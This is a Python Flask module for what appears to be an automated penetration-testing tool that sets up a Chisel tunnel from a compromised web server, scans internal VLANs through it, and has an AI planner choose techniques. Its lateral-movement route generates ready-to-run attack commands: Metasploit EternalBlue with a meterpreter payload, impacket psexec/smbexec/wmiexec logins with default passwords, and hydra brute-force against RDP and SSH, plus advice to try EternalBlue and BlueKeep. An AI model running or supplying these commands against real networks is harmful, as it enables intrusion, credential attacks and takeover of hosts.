from typing import List, Dict
"""
Pivot Routes — Flask blueprint for the pivot assessment UI.
Powers the existing pivot_assessment.html template.
Phases: Pivot Setup → Internal Scan → Lateral Movement.
"""

import logging
import time
from flask import Blueprint, jsonify, request, session as flask_session, render_template
from config import Config
from core.helpers import _active_validation_results
from pivot.pivot_engine import PivotEngine
from mapping.technique_mapper import map_vulnerabilities
from ai.technique_planner import generate_ai_technique_plan

log = logging.getLogger(__name__)

pivot_bp = Blueprint("pivot", __name__, url_prefix="/pivot")

# Global pivot engine instance
_pivot_engine: PivotEngine = None


def init_pivot_engine():
    """Initialize the pivot engine with Kali IP from config."""
    global _pivot_engine
    _pivot_engine = PivotEngine(kali_ip=Config.KALI_IP)
    log.info(f"Pivot engine initialized (Kali IP: {Config.KALI_IP})")
    return _pivot_engine


def get_pivot_engine() -> PivotEngine:
    """Get the global pivot engine instance."""
    global _pivot_engine
    if _pivot_engine is None:
        _pivot_engine = init_pivot_engine()
    return _pivot_engine


# ── Template Route ──────────────────────────────────────────

@pivot_bp.route("/assessment")
def pivot_assessment_page():
    """Render the pivot assessment HTML page."""
    return render_template("pivot_assessment.html")


# ── Phase 1: Pivot Setup ───────────────────────────────────

@pivot_bp.route("/setup", methods=["POST"])
def pivot_setup():
    """
    Start the Chisel server on Kali and generate the client command
    to deploy on the compromised web server.
    """
    data = request.get_json(silent=True) or {}
    chisel_port = int(data.get("chisel_port", 8080))
    socks_port = int(data.get("socks_port", 1080))
    platform = data.get("platform", "linux")
    target_ip = data.get("target_ip", Config.KALI_IP)

    engine = get_pivot_engine()

    # Step 1: Start Chisel server
    if not engine.start_chisel_server(port=chisel_port, socks_port=socks_port):
        return jsonify({
            "ok": False,
            "error": "Failed to start Chisel server. Is chisel installed?",
        }), 500

    # Step 2: Generate client deploy command
    client_cmd = engine.generate_client_command(platform=platform, chisel_port=chisel_port)

    # Step 3: Configure proxychains
    engine.configure_proxychains(socks_port=socks_port)

    return jsonify({
        "ok": True,
        "phase": "pivot_setup",
        "chisel_server": f"{Config.KALI_IP}:{chisel_port}",
        "socks_proxy": f"127.0.0.1:{socks_port}",
        "client_command": client_cmd,
        "instructions": [
            "1. Chisel server is now running on Kali",
            "2. Run the client command ON THE COMPROMISED WEB SERVER",
            "   via the reverse shell or command injection",
            "3. The client will connect back and create a SOCKS tunnel",
            "4. All proxychains traffic will route through the tunnel",
        ],
        "internal_ranges": [
            "10.10.10.0/24 (ADMIN VLAN)",
            "10.10.20.0/24 (USERS VLAN)",
            "172.16.0.0/24 (EXTERNAL FW)",
            "172.16.1.0/24 (INTERNAL FW)",
        ],
    })


@pivot_bp.route("/status", methods=["GET"])
def pivot_status():
    """Get current pivot engine status."""
    engine = get_pivot_engine()
    return jsonify({
        "ok": True,
        "pivot": engine.get_status(),
    })


# ── Phase 2: Internal Network Scan ─────────────────────────


def _pivot_results_to_parsed_results(
    results: List[Dict],
) -> dict:
    """Convert pivot scan results into normal mapper input."""

    hosts = []
    service_inventory = []

    for discovered_host in results or []:
        if not isinstance(discovered_host, dict):
            continue

        ip_address = str(
            discovered_host.get("ip") or ""
        ).strip()

        if not ip_address:
            continue

        port_findings = []

        for raw_port in (
            discovered_host.get("open_ports", []) or []
        ):
            if not isinstance(raw_port, dict):
                continue

            try:
                port_number = int(
                    raw_port.get("port")
                )
            except (TypeError, ValueError):
                continue

            service_name = str(
                raw_port.get("service") or "unknown"
            ).strip().lower()

            finding = {
                "port": port_number,
                "protocol": "tcp",
                "state": "open",
                "service": service_name,
                "product": str(
                    raw_port.get("product") or ""
                ).strip(),
                "version": str(
                    raw_port.get("version") or ""
                ).strip(),
            }

            port_findings.append(finding)

            service_inventory.append(
                {
                    "host": ip_address,
                    **finding,
                }
            )

        hosts.append(
            {
                "address": {
                    "primary": ip_address,
                },
                "hostname": "",
                "os": {
                    "name": str(
                        discovered_host.get("os")
                        or "Unknown"
                    ),
                },
                "port_findings": port_findings,
                "discovered_via": "pivot",
            }
        )

    return {
        "target_ip": (
            hosts[0]["address"]["primary"]
            if hosts
            else ""
        ),
        "hosts": hosts,
        "service_inventory": service_inventory,
        "source": "pivot",
    }


@pivot_bp.route("/scan", methods=["POST"])
def pivot_scan():
    """Scan an internal network range through the pivot."""

    data = request.get_json(silent=True) or {}

    target_range = data.get(
        "range",
        "10.10.20.0/24",
    )
    ports = data.get(
        "ports",
        "21,22,80,445,3389,5985,5986",
    )
    timeout = int(data.get("timeout", 60))

    engine = get_pivot_engine()

    if not engine.is_running:
        return jsonify(
            {
                "ok": False,
                "error": (
                    "Pivot is not active. "
                    "Run /pivot/setup first."
                ),
            }
        ), 400

    results = engine.scan_network(
        target_range,
        ports=ports,
        timeout=timeout,
    )

    targets = []

    for host in results:
        service_names = [
            str(port.get("service") or "").lower()
            for port in host.get("open_ports", [])
            if isinstance(port, dict)
        ]

        target_type = "unknown"

        if any(
            service in service_names
            for service in (
                "microsoft-ds",
                "smb",
            )
        ):
            target_type = "windows_smb"

        elif "ssh" in service_names:
            target_type = "linux_ssh"

        elif (
            "rdp" in service_names
            or "ms-wbt-server" in service_names
        ):
            target_type = "windows_rdp"

        targets.append(
            {
                "ip": host.get("ip", ""),
                "os": host.get("os", ""),
                "open_ports": host.get(
                    "open_ports",
                    [],
                ),
                "type": target_type,
            }
        )

    parsed_pivot_results = (
        _pivot_results_to_parsed_results(results)
    )

    try:
        mitre_mapping = map_vulnerabilities(
            parsed_pivot_results
        )

        if mitre_mapping.get(
            "recommended_techniques"
        ):
            ai_plan = generate_ai_technique_plan(
                mitre_mapping,
                preferred_mode="hybrid",
            )
        else:
            ai_plan = {
                "recommended_mode": "hybrid",
                "selected_technique_ids": [],
                "reasoning": (
                    "No mapped techniques were produced "
                    "for the pivot-discovered hosts."
                ),
                "technique_explanations": [],
                "next_steps": [],
            }

    except Exception as exc:
        log.exception(
            "Could not process pivot-discovered hosts"
        )

        mitre_mapping = {
            "vulnerabilities": [],
            "recommended_techniques": [],
            "error": str(exc),
        }

        ai_plan = {
            "selected_technique_ids": [],
            "reasoning": (
                "Pivot results could not be processed "
                "by the AI planner."
            ),
            "technique_explanations": [],
            "next_steps": [],
            "error": str(exc),
        }

    return jsonify(
        {
            "ok": True,
            "phase": "internal_scan",
            "target_range": target_range,
            "hosts_found": len(results),
            "targets": targets,
            "parsed_pivot_results": (
                parsed_pivot_results
            ),
            "mitre_mapping": mitre_mapping,
            "ai_plan": ai_plan,
            "recommendations": (
                _generate_recommendations(targets)
            ),
        }
    )


def _generate_recommendations(targets):
    """Generate human-readable attack recommendations."""
    recs = []
    has_windows = any(t.get("type") == "windows_smb" for t in targets)
    has_windows_rdp = any(t.get("type") == "windows_rdp" for t in targets)
    has_linux = any(t.get("type") == "linux_ssh" for t in targets)

    if has_windows:
        recs.append("Windows SMB hosts detected — try EternalBlue (MS17-010) via proxychains")
    if has_windows_rdp:
        recs.append("RDP accessible — check for BlueKeep (CVE-2019-0708) or try RDP brute-force")
    if has_linux:
        recs.append("Linux SSH hosts detected — try credential brute-force via hydra through proxychains")

    if not recs:
        recs.append("No clearly identifiable targets — try expanding scan range or ports")
    return recs


# ── Phase 3: Lateral Movement Commands ─────────────────────

@pivot_bp.route("/lateral/commands", methods=["POST"])
def lateral_commands():
    """
    Generate lateral movement commands (MSF, PSExec, etc.)
    that can be run through the pivot via proxychains.
    """
    data = request.get_json(silent=True) or {}
    target_ip = data.get("target_ip", "")
    technique = data.get("technique", "ms17_010")

    if not target_ip:
        return jsonify({"ok": False, "error": "target_ip required"}), 400

    commands = {
        "ms17_010": (
            f"proxychains -q msfconsole -q -x '"
            f"use exploit/windows/smb/ms17_010_eternalblue; "
            f"set RHOSTS {target_ip}; "
            f"set PAYLOAD windows/x64/meterpreter/bind_tcp; "
            f"set LPORT 4444; "
            f"exploit -z; "
            f"sessions -l'"
        ),
        "psexec": (
            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py "
            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
        ),
        "smbexec": (
            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py "
            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
        ),
        "wmiexec": (
            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "
            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
        ),
        "winrm": (
            f"proxychains -q crackmapexec winrm {target_ip} -u Administrator "
            f"-p {data.get('password', 'P@ssw0rd')}"
        ),
        "rdp_brute": (
            f"proxychains -q hydra -l Administrator "
            f"-P /usr/share/wordlists/rockyou.txt rdp://{target_ip} -t 4"
        ),
        "ssh_brute": (
            f"proxychains -q hydra -l {data.get('username', 'root')} "
            f"-P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4"
        ),
    }

    cmd = commands.get(technique)
    if not cmd:
        return jsonify({"ok": False, "error": f"Unknown technique: {technique}"}), 400

    return jsonify({
        "ok": True,
        "phase": "lateral_movement",
        "target": target_ip,
        "technique": technique,
        "command": cmd,
        "proxychains": True,
        "note": "Run this command in a Kali terminal window (proxychains routes through the pivot)",
    })


# ── Cleanup ────────────────────────────────────────────────

@pivot_bp.route("/cleanup", methods=["POST"])
def pivot_cleanup():
    """Stop the pivot and clean up resources."""
    engine = get_pivot_engine()
    engine.cleanup()
    return jsonify({
        "ok": True,
        "message": "Pivot engine stopped and cleaned up",
    })


# ── Register Blueprint ─────────────────────────────────────

def register_routes(app):
    """Register pivot routes on the Flask app."""
    app.register_blueprint(pivot_bp)
    init_pivot_engine()
    log.info("Pivot routes registered")